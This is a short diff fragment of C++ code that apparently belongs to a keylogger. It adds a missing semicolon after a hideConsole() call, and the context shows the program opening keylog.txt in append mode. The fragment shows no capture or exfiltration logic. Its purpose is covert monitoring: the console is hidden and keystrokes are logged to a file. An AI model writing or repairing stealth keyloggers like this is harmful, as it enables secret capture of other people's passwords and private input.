@@ -17,7 +17,7 @@ void hideConsole(){
 
 int main(){
 
-    hideConsole()
+    hideConsole();
 
     std::ofstream keylog("keylog.txt", std::ios::app); // open or create a text file in append mode
 
